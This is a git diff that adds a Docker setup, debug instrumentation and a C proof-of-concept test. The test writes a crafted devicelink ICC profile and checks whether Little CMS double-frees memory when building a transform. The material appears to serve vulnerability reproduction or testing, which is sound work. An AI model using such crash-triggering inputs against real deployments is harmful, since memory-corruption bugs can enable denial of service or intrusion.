diff --git a/Dockerfile.vuln b/Dockerfile.vuln
new file mode 100644
index 0000000..19aa9f2
--- /dev/null
+++ b/Dockerfile.vuln
@@ -0,0 +1,28 @@
+FROM ubuntu:20.04
+
+RUN apt-get update && apt-get install -y \
+    build-essential \
+    cmake \
+    libtiff-dev \
+    libjpeg-dev \
+    zlib1g-dev \
+    libpng-dev \
+    && rm -rf /var/lib/apt/lists/*
+
+WORKDIR /app
+
+COPY . /app/
+
+# Build the library
+RUN cd /app && \
+    ./configure && \
+    make -j$(nproc)
+
+# Compile the test case
+RUN gcc -o test_double_free test_double_free.c -I. -L./.libs -llcms2 -lm -ldl
+
+# Set the library path
+ENV LD_LIBRARY_PATH=/app/.libs
+
+# Run the test
+CMD ["/app/test_double_free"]
diff --git a/src/cmscnvrt.c b/src/cmscnvrt.c
index 908f787..5a112bc 100644
--- a/src/cmscnvrt.c
+++ b/src/cmscnvrt.c
@@ -25,6 +25,7 @@
 //
 
 #include "lcms2_internal.h"
+#include <stdio.h>
 
 
 // Link several profiles to obtain a single LUT modelling the whole color transform. Intents, Black point
@@ -472,6 +473,7 @@ cmsPipeline* DefaultICCintents(cmsContext       ContextID,
                                cmsFloat64Number AdaptationStates[],
                                cmsUInt32Number  dwFlags)
 {
+    printf("[INSTRUMENTED] DefaultICCintents");
     cmsPipeline* Lut = NULL;
     cmsPipeline* Result;
     cmsHPROFILE hProfile;
diff --git a/src/cmscnvrt.c.debug b/src/cmscnvrt.c.debug
new file mode 100644
index 0000000..c3de824
--- /dev/null
+++ b/src/cmscnvrt.c.debug
@@ -0,0 +1,22 @@
+#include <stdio.h>
+
+// Add this at the beginning of DefaultICCintents function
+printf("DEBUG: Entering DefaultICCintents\n");
+
+// Add this after the line: cmsPipeline* Lut = _cmsReadDevicelinkLUT(hProfile, Intent);
+printf("DEBUG: _cmsReadDevicelinkLUT returned %p\n", (void*)Lut);
+
+// Add this before the line: if (!cmsPipelineCat(Result, Lut)) goto Error;
+printf("DEBUG: About to call cmsPipelineCat(Result, Lut)\n");
+
+// Add this after the line: if (!cmsPipelineCat(Result, Lut)) goto Error;
+printf("DEBUG: cmsPipelineCat %s\n", (cmsPipelineCat(Result, Lut) ? "succeeded" : "failed"));
+
+// Add this before the line: cmsPipelineFree(Lut);
+printf("DEBUG: About to free Lut at %p\n", (void*)Lut);
+
+// Add this at the Error: label
+printf("DEBUG: Reached Error label\n");
+
+// Add this before the second cmsPipelineFree(Lut);
+printf("DEBUG: About to free Lut again at %p\n", (void*)Lut);
diff --git a/test_double_free.c b/test_double_free.c
new file mode 100644
index 0000000..e1c9054
--- /dev/null
+++ b/test_double_free.c
@@ -0,0 +1,182 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <signal.h>
+#include <setjmp.h>
+#include "include/lcms2.h"
+
+// Global variables for signal handling
+static jmp_buf jmpbuf;
+static int crash_detected = 0;
+
+// Signal handler for segmentation faults and aborts
+void crash_handler(int sig) {
+    crash_detected = 1;
+    printf("Caught signal %d (crash detected)\n", sig);
+    longjmp(jmpbuf, 1);
+}
+
+// Function to create a malformed ICC profile that will trigger the double free
+void create_malformed_profile(const char* filename) {
+    cmsHPROFILE hProfile;
+    cmsPipeline* pipeline;
+    cmsStage* stage;
+    cmsContext context = NULL;
+    
+    // Create a devicelink profile which will be used to trigger the vulnerability
+    hProfile = cmsCreateProfilePlaceholder(context);
+    if (!hProfile) {
+        fprintf(stderr, "Failed to create profile placeholder\n");
+        return;
+    }
+    
+    // Set profile class to devicelink - this is crucial for triggering the vulnerability
+    cmsSetDeviceClass(hProfile, cmsSigLinkClass);
+    
+    // Set color spaces (RGB to RGB for simplicity)
+    cmsSetColorSpace(hProfile, cmsSigRgbData);
+    cmsSetPCS(hProfile, cmsSigRgbData);
+    
+    // Create a simple pipeline that will be used in the profile
+    pipeline = cmsPipelineAlloc(context, 3, 3);
+    if (!pipeline) {
+        fprintf(stderr, "Failed to create pipeline\n");
+        cmsCloseProfile(hProfile);
+        return;
+    }
+    
+    // Add a simple matrix stage
+    {
+        cmsFloat64Number matrix[9] = {
+            1.0, 0.0, 0.0,
+            0.0, 1.0, 0.0,
+            0.0, 0.0, 1.0
+        };
+        cmsFloat64Number offset[3] = {0.0, 0.0, 0.0};
+        
+        stage = cmsStageAllocMatrix(context, 3, 3, matrix, offset);
+        if (!stage) {
+            fprintf(stderr, "Failed to create matrix stage\n");
+            cmsPipelineFree(pipeline);
+            cmsCloseProfile(hProfile);
+            return;
+        }
+        
+        cmsPipelineInsertStage(pipeline, cmsAT_END, stage);
+    }
+    
+    // Add a CLut stage with invalid data to cause cmsPipelineCat to fail
+    {
+        cmsUInt16Number* table;
+        cmsUInt32Number clutPoints = 2;
+        cmsUInt32Number tableSize = clutPoints * clutPoints * clutPoints * 3;
+        
+        table = (cmsUInt16Number*)malloc(tableSize * sizeof(cmsUInt16Number));
+        if (!table) {
+            fprintf(stderr, "Failed to allocate memory for CLUT\n");
+            cmsPipelineFree(pipeline);
+            cmsCloseProfile(hProfile);
+            return;
+        }
+        
+        // Fill with invalid data
+        memset(table, 0xFF, tableSize * sizeof(cmsUInt16Number));
+        
+        stage = cmsStageAllocCLut16bit(context, clutPoints, 3, 3, table);
+        free(table);
+        
+        if (!stage) {
+            fprintf(stderr, "Failed to create CLUT stage\n");
+            cmsPipelineFree(pipeline);
+            cmsCloseProfile(hProfile);
+            return;
+        }
+        
+        cmsPipelineInsertStage(pipeline, cmsAT_END, stage);
+    }
+    
+    // Add the pipeline to the profile
+    cmsWriteTag(hProfile, cmsSigAToB0Tag, pipeline);
+    
+    // Write the profile to a file
+    cmsSaveProfileToFile(hProfile, filename);
+    
+    // Clean up
+    cmsPipelineFree(pipeline);
+    cmsCloseProfile(hProfile);
+    
+    printf("Created malformed profile: %s\n", filename);
+}
+
+// Function to test if the vulnerability exists
+int test_vulnerability(const char* profile_path) {
+    cmsHPROFILE hProfile;
+    cmsHTRANSFORM hTransform;
+    
+    printf("Testing profile: %s\n", profile_path);
+    
+    // Set up signal handlers for crashes
+    signal(SIGSEGV, crash_handler);
+    signal(SIGABRT, crash_handler);
+    signal(SIGBUS, crash_handler);
+    
+    // Use setjmp to handle crashes
+    if (setjmp(jmpbuf) == 0) {
+        // Open the malformed profile
+        hProfile = cmsOpenProfileFromFile(profile_path, "r");
+        if (!hProfile) {
+            fprintf(stderr, "Failed to open profile\n");
+            return 1; // Error opening profile, not a vulnerability
+        }
+        
+        printf("Profile opened successfully\n");
+        
+        // Try to create a transform using the profile
+        // This will trigger the DefaultICCintents function with our malformed profile
+        // If the vulnerability exists, this will cause a double free
+        hTransform = cmsCreateTransform(
+            hProfile, TYPE_RGB_8,
+            hProfile, TYPE_RGB_8,
+            INTENT_RELATIVE_COLORIMETRIC, 0);
+        
+        printf("Transform creation %s\n", hTransform ? "succeeded" : "failed");
+        
+        // If we get here without crashing, the vulnerability might not exist
+        // or we didn't trigger it correctly
+        if (hTransform) {
+            cmsDeleteTransform(hTransform);
+        }
+        
+        cmsCloseProfile(hProfile);
+    } else {
+        // We got here because of a crash
+        printf("Crash detected! The vulnerability likely exists.\n");
+        return 1; // Vulnerability exists
+    }
+    
+    // Reset signal handlers
+    signal(SIGSEGV, SIG_DFL);
+    signal(SIGABRT, SIG_DFL);
+    signal(SIGBUS, SIG_DFL);
+    
+    return 0;
+}
+
+int main() {
+    const char* profile_path = "malformed.icc";
+    int result;
+    
+    // Create the malformed profile
+    create_malformed_profile(profile_path);
+    
+    // Test for the vulnerability
+    result = test_vulnerability(profile_path);
+    
+    if (crash_detected) {
+        printf("Test FAILED: Vulnerability exists (double free detected)\n");
+        return 1; // Exit with non-zero code if vulnerability exists
+    } else {
+        printf("Test PASSED: Vulnerability does not exist\n");
+        return 0; // Exit with zero code if vulnerability does not exist
+    }
+}
